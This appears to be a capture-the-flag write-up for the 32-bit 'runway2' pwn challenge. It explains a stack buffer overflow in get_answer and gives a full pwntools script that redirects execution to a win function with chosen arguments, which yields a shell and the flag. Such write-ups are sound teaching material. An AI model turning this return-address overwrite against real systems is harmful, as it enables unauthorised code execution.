https://ctftime.org/event/2449

# runway2 (pwn)

Now with a twist!

nc challs.pwnoh.io 13402

## Analysis

We can see that this is a 32 bit x86 binary with no stack canaries or PIE:

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

We can note that arguments are passed on the stack in 32 bit x86 binaries:

```
$ ret abi 32 
linux 🐧 x86

scratch/caller-save/volatile:
  EAX ECX EDX XMM0-XMM7 YMM0-YMM7 ZMM0-ZMM7

callee-save/non-volatile:
  EBX ESI EDI EBP

call:
  STACK => EAX XMM0 YMM0 ZMM0

syscall:
  EAX EBX ECX EDX ESI EDI EBP => EAX

🔗 https://www.agner.org/optimize/calling_conventions.pdf
```

We can see that the `win` function requires the first two arguments to have specific values. We can set these by controlling the space on the stack used to define the values of the arguments when calling the function:

```C
int win(int check, int mate) {
    if (check == 0xc0ffee && mate == 0x007ab1e) {
        printf("You win! Here is your shell:\n");
        fflush(stdout);

        system("/bin/sh");
    } else {
        printf("No way!");
        fflush(stdout);
    }
}
```

We can see that `get_answer` has a stack buffer overflow which allows us to control the return address and at least two arguments on the stack:

```C
int get_answer() {
    char answer[16];

    fgets(answer, 0x40, stdin);

    return strtol(answer, NULL, 10);
}
```

Note that the quiz portion of the program serves only as window dressing. It is not required to perform any specific operations with the `calculate_answer` function for example.

## Solution

1) Overflow the buffer on the stack to reach the return address
2) Specify the address of the `win` function as the new return address
3) Note that to align the stack there is a gap between the return address and the first parameter
4) Place the values for `check` and `mate` into two 4 byte slots on the stack
5) Note that the first parameter has a lower address on the stack and so it comes first in our payload which is written from a lower address to a higher address - when calling functions we push arguments onto the stack from right to left decrementing the stack pointer as we do

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./runway2", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b win")
p = remote("challs.pwnoh.io", 13402)

payload = b""
payload += b"A" * 0x1c
payload += p32(elf.sym["win"])
payload += p32(0)
payload += p32(0xc0ffee)
payload += p32(0x007ab1e)

p.sendlineafter(b"?\n", payload)

p.readline()

p.sendline(b"/bin/cat flag.txt")

p.interactive() # bctf{I_m1sS_4r1thm3t1c_qu1ZZ3s_2349adb53baa2955}
```

## Flag
`bctf{I_m1sS_4r1thm3t1c_qu1ZZ3s_2349adb53baa2955}`

smiley 2024/09/29
